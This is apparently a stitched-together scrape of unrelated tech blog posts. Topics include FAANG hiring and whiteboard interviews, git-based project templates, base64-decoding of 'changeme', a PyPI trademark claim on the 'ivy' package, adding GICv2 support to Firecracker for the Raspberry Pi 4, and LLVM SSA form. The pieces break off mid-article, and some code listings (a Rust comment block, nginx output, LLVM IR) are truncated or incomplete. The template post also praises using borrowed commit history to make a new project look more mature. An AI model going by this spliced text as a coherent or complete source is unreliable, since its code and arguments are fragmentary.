<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re a brilliant engineer who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A poorly-designed take-home, requiring skills that you don’t have and won’t need for the job, and that you spend hours thinking through and working on, send in, and get rejected without getting any feedback.</li></ul>



<p>Probably neither.</p>



<p><strong>So …</strong></p></div></article></main></section></div></div>

</pre></div><p>This allows me to keep my downstream project up to date with the template. When I discover another tool, this can be merged into the downstream project for example. It allows evolving the template over time as I learn more about whatever programming language I’m&nbsp;using.</p><p>It also gives me default branding. Which makes it look more ‘professional’. Although I don’t like branding, I know this is necessary. Having it there by default makes it so that I don’t forget to do&nbsp;this.</p><p>When starting a project you also gain some free authoritativeness, because you have a longer commit history the project looks like it is more mature. Although this practice is a little deceptive, there is a core of truth, because the template has gotten a lot of attention. If you feel offended by this practice, ask yourself first, why are you trusting git histories? These can be <a href="https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History">rewritten anyway</a>. This authoritativeness also gives me a small moral boost. It just <em>feels</em> better to have a project with well thought out tools being started and some history rather then the ‘normal’ stuff everyone starts&nbsp;with.</p><h2 id="alternatives">Alternatives</h2><p>The alternatives are using tools that spit out templates. In the haskell world these are <a href="https://github.com/commercialhaskell/stack-templates">stack new</a>, <a href="https://cabal.readthedocs.io/en/latest/developing-packages.html#using-cabal-init">cabal init</a> or <a href="https://github.com/kowainik/summoner">summoner</a>. These tools are simply a glorified <code>sed</code> on projects folders: They find and replace variables. There is no versioning, there is no personalization except what limited variables&nbsp;give.</p><p>Because these tools don’t take into account history, the first commit will be a large commit with a message like ‘Initial’. I find this problematic because it squashes all the work that went into creating the template. Information is lost, for no&nbsp;reason.</p><p>These tools don’t use git to track their templates. They could, but they don’t. Maybe they wanted to be <span>VCS</span><sup id="fnref-1"><a href="#fn-1">2</a></sup> agnostic? I’m speculating, but even if you wanted to be that, you could still use any version system to track the template and recreate the history in the <span>VCS</span> desired by the user. This at least gives the user their history of the template back. While also giving them the choice of <span>VCS</span><sup id="fnref-8"><a href="#fn-8">3</a></sup></p><h2 id="a-template-hierarchy">A template&nbsp;hierarchy</h2><p>What I described in the intro can be taken a step further. A template of a template can be used to create another new template. For example, say you’re a fan of <a href="https://nixos.org/">nix</a> or <a href="https://www.gnu.org/software/make/manual/make.html">make</a>, so why not put a makefile and a <a href="https://nix.dev/tutorials/towards-reproducibility-pinning-nixpkgs.html#pinning-nixpkgs">nix pin</a> in some template of templates project. These tools don’t care about which language you use, so their configuration can be shared among Python, Java and Haskell projects for example. Maybe for github it could even have a partial travis or github actions <span>CI</span>&nbsp;setup.</p><p>Now, say you’re starting a new Python project, but have no template yet for that programming language. You simply clone this template of templates and customize it to your own <a href="https://stackoverflow.com/questions/25011078/what-does-pythonic-mean#:~:text=Pythonic%20means%20code%20that%20doesn,is%20intended%20to%20be%20used.">Pythonic</a> needs. You can still pull in the upstream changes from your template of templates, for example to upgrade the nix pin. The big advantage of course is that a change in the template of templates can easily merged into all downstream projects with&nbsp;git.</p><p>I convinced the reader that using git is the superior way for template management. It’s simpler, and more flexible. I also convinced the authors of stack, cabal and summoner to drop their current way of managing templates and use git&nbsp;instead.</p><p>Or, more likely, no-one read this&nbsp;far.</p></div><small></small></article><section></section><section></section></div></div>]]>

        <p><a href="https://en.wikipedia.org/wiki/Base64">Base64-encoding</a> is ubiquitous in our
modern world. Many programs communicate in base64-encoded messages, since these
have nice properties: They consist of a very limited subset of ASCII characters,
and can thus be displayed as text. E-Mails for example are commonly encoded in
base64 in transfer, which can be seen in the <code>Content-Transfer-Encoding</code> header.</p>

<p>Where I volunteer we have a tradition of putting <code>changeme</code> as a placeholder for
many template variables indicating that they should be overwritten later. Thus,
if we later still see <code>changeme</code> anywhere we know that somewhere somebody must
have forgotten to specify a variable<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

<p>Sometimes these template variables should correspond to base64-encoded content,
i.e. the base64-decoding of said variable should produce meaningful content. But
what happens if somebody forgets to define said variable, and it is substituted
with<code>changeme</code> instead? I always thought that it would fail to
decode the string since the probability that <code>changeme</code> is actually valid base64
encoding must be very low. But lo and behold, this is not the case:</p>

<pre><code>% echo changeme | base64 -d
r�[1m
</code></pre>

<p>Running <code>hexdump</code> on the output we can identify the characters:</p>

<pre><code>% echo changeme | base64 -d | hexdump -C
00000000  72 16 a7 81 e9 9e      |r.....|
00000006
</code></pre>

<p>Mostly nonsense, but the second byte is interesting: It is an ASCII control
character <sup id="fnref:2"><a href="#fn:2">2</a></sup>, meaning trips up all sorts of programs which expect to read
printable ASCII characters, such as JSON deserializers.</p>

<p>This bug actually occurred when I was migrating some applications between
different Kubernetes clusters: In the old cluster the application ran without
problems, but I forgot to specify some variable in the new cluster, and it lead
to Go complaining about non-ASCII characters in a JSON string.</p>

<p>I guess the moral of the story is: If you use dummy values be sure that they
cannot be misinterpreted.</p>

I found an odd email in my inbox yesterday from a company claiming ownership of a Python package, <a href="https://pypi.org/project/ivy/">Ivy</a>, that I registered on the Python Package Index back in August 2016, more than four years ago. The company is claiming ownership of the package on the basis of a <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">UK trademark</a> on the word "ivy" filed in August 2020.
</p>
<p>
Here's the full text of the email:
</p>
<div>
<p>
Dear Mr. Mulholland,
</p>
<p>
We are genuinely sorry to be the bearers of bad news, but we are writing
after following the <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">advice</a> on
the PyPI website. We would kindly like to request that the "ivy" package name be released from PyPI, on the grounds that it violates our <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">trademark</a>.
PyPI lists <a href="https://www.python.org/dev/peps/pep-0541/#invalid-projects">trademark violation</a> as grounds to invalidate a project on PyPI, with subsequent removal. If you would be more comfortable waiting for official involvement of PyPI before releasing the name, then we will gladly <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">open a new issue</a> with PyPI.
</p>
<p>
Please let us know if you have any questions regarding this request.
</p>
<p>
Kind Regards,<br>
The Ivy Team

I have no idea what this company does, they didn't link to their website, but they probably sell yoga mats judging from the stretchiness of this stretch.

Name Shortages and Namespacing
</h3>
<p>
Unfortunately the Python Package Index uses a single flat namespace for all packages so the name famine is a real and growing problem. I've been disappointed all too many times myself to find that a name I wanted to use was occupied by an abandoned project that hadn't been touched in years. (This isn't the case for <a href="https://github.com/dmulholl/ivy">Ivy</a> which is being actively developed.)
</p>
<p>
The problem must be getting serious as the Package Index's maintainers have introduced a set of formal guidelines and processes (<a href="https://www.python.org/dev/peps/pep-0541/">PEP 541</a>) for arbitrating disputes over package names — I certainly don't envy them the task.
I think the long-term solution instead is to introduce namespacing by username so packages like <code>dmulholl/ivy</code> and <code>yogamasters/ivy</code> can happily coexist.
</p>
<p>
I've actually been approached several times over the years by people wanting control over the <code>ivy</code> package. Usually they offer to buy it from me — this is the first time I've been threatened with a trademark. It'll be interesting to see how the Package Index maintainers handle the dispute.

October 24, 2020 | https://blog.cloudkernels.net/posts/firecracker-rpi4/ | <a href="https://web.archive.org/web/*/https://blog.cloudkernels.net/posts/firecracker-rpi4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Since we got our hands on the new Raspberry Pi 4, we started exploring how
various virtualization technologies behave on the board. First thing we tried is how to run <a href="https://cloudkernels.github.io/posts/rpi4-64bit-virt/">Nabla</a> on it and how it compares to native KVM.</p>

<p>Next thing we wanted to try is <a href="https://github.com/firecracker-microvm/firecracker">firecracker</a>, the notorious micro-VMM that
Amazon Lambda &amp; Fargate run on. To our disappointment, firecracker was not
<a href="https://github.com/firecracker-microvm/firecracker/issues/1196">yet</a> running on RPi4. So we started looking into coding in the necessary
changes :)</p>

<p>After a bit of investigation, we figured out that the key missing piece is
support for the GICv2 ARM interrupt controller. In fact, firecracker only
supports GIC version 3 since it was open-sourced, but not version 2, which is
the version appearing in the Raspberry Pi series, as well as in other popular
boards, like the Hikey 970 we got our hands on, or Khadas VIM3. A bit more
digging into the internals of firecracker and the Linux kernel, helped us
work out the details and open a <a href="https://github.com/firecracker-microvm/firecracker/pull/1235">pull-request</a> which adds support for the
missing parts.</p>

<h4 id="changes-in-firecracker">Changes in Firecracker</h4>

<p>The Generic Interrupt Controller (GIC) is the IP block in the ARM processors
that implements interrupt handling. The Linux kernel supports user- and
kernel-space emulation for GICv2 as well as GICv3 and v4. However, Firecracker
only handles the GICv3-related configuration of the virtual GIC (VGIC).
Similarly, setting up the FDT for the guest microVM from Firecracker only
handles GIC-v3 devices.</p>

<p>In terms of code organization, the GIC related code currently exposes a function
for setting up GICv3 performing the corresponding <code>ioctl</code> KVM commands. The
first part of our PR changes this by introducing a GIC Trait which defines the
common interface for all GIC implementations. Even though it is still under
discussion, what exactly will be in the Trait in its final form, it will be
something along the following lines:</p>
<div><pre><code data-lang="rs"><span>/// Trait for GIC devices.
</span><span></span><span>pub</span><span> </span><span>trait</span><span> </span>GICDevice<span> </span>{<span>
</span><span>    </span><span>/// Returns the GIC version of the device
</span><span></span><span>    </span><span>fn</span> <span>version</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>u32</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns the file descriptor of the GIC device
</span><span></span><span>    </span><span>fn</span> <span>device_fd</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span><span>DeviceFd</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns an array with GIC device properties
</span><span></span><span>    </span><span>fn</span> <span>device_properties</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span>[<span>u64</span>];<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>With this in place, we can define objects per GIC version, which implement this
Trait, and still have the rest of the code deal with the <code>GICDevice</code> Trait,
which is transparent to the GIC version.</p>

<p>The implementations for each version, implement the Trait and a <code>new</code> function
which is used to create the new object:</p>
<div><pre><code data-lang="rs"><span>pub</span><span> </span><span>fn</span> <span>new</span>(vm: <span>&amp;</span><span>VmFd</span>,<span> </span>vcpu_count: <span>u64</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span><span>Box</span><span>&lt;</span>GICDevice<span>&gt;&gt;</span><span>
</span></code></pre></div>
<p>The differentiation between the two versions lays in the VGIC register
attributes that each device exposes. As a result, the work we need to do is essentially to <code>mmap</code> their addresses.</p>

<p>GICv2 relevant addresses include the <strong>distributor</strong> and <strong>cpu</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.
</span><span> We are placing the GIC below 1GB so we need to substract the size of the distributor.

<p>Regarding the FDT creation, there are differences between v2 and v3 regarding
the interrupt controller <code>intc</code> node.</p>

<p>First, we need to define the GICv2 <code>compatible</code> property to be <code>arm,gic-400</code>,
since it is the GIC-400 chip which implements GICv2. Next is the <code>reg</code>
property of the FDT, which includes the addresses and the corresponding sizes of
the GIC registers, i.e. distributor and CPU for GICv2, distributor and
redistributor for GICv3. Finally, we fix the <code>interrupts</code> property which
determines the interrupt source of the VGIC maintenance interrupt. The
corresponding values for GICv2 were taken from the respective <a href="https://github.com/torvalds/linux/blob/master/Documentation/devicetree/bindings/interrupt-controller/arm%2Cgic.yaml">Linux Kernel entries</a>.</p>

<h4 id="build-firecracker-with-rpi4-support">Build firecracker with RPi4 support</h4>

<p>While waiting for the patch to merge upstream you can go ahead and check out it
yourself.</p>

<p>Clone and build our fork of firecracker (keep in mind that while the PR review
is going on, we might force-update the branch).</p>
<div><pre><code data-lang="bash">$ git clone https://github.com/cloudkernels/firecracker.git
$ <span>cd</span> firecracker
$ ./tools/devtool build</code></pre></div>
<p>Next you need a kernel image and a root filesystem to run with your firecracker
build. You can grab the pre-built kernel image and rootfs here:</p>
<div><pre><code data-lang="bash">$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4 </code></pre></div>
<p>Alternatively, you can build your own kernel and rootfs using the following
steps provided by the firecracker docs
<a href="https://github.com/cloudkernels/firecracker/blob/master/docs/rootfs-and-kernel-setup.md">here</a></p>

<h4 id="launch-our-image">Launch our image</h4>

<p>To launch our image we will use the <a href="https://github.com/firecracker-microvm/firectl">firectl</a> tool. We need, to setup a tap
device for the networking or our firecracker microVM.</p>
<div><pre><code data-lang="bash">$ sudo ip tuntap add dev tap0 mode tap
$ sudo ip addr add <span>172</span>.16.0.1/24 dev tap0
$ sudo ip link <span>set</span> tap0 up</code></pre></div>
<p>And we launch the microVM using firectl:</p>
<div><pre><code data-lang="bash">firectl --firecracker-binary<span>=</span><span>${</span><span>PATH_TO_FC_BIN</span><span>}</span> --kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>	--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>	--kernel-opts<span>=</span><span>"console=ttyS0 reboot=k panic=1 pci=off ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>	--root-drive<span>=</span>./nginx_fc.ext4</code></pre></div>
<p>Here, we used here the <code>ip</code> kernel boot parameter to give the <code>172.16.0.42</code>.</p>

<p>Finally, we try out our nginx server:</p>
<div><pre><code data-lang="html">curl 172.16.0.42
<span>&lt;!DOCTYPE html&gt;</span>
&lt;<span>html</span>&gt;
&lt;<span>head</span>&gt;

        <span>margin</span>: <span>0</span> <span>auto</span>;
        <span>font-family</span>: Tahoma, Verdana, Arial, <span>sans-serif</span>;
    }
&lt;/<span>style</span>&gt;
&lt;/<span>head</span>&gt;
&lt;<span>body</span>&gt;
&lt;<span>h1</span>&gt;Welcome to nginx!&lt;/<span>h1</span>&gt;
&lt;<span>p</span>&gt;If you see this page, the nginx web server is successfully installed and

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>

  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

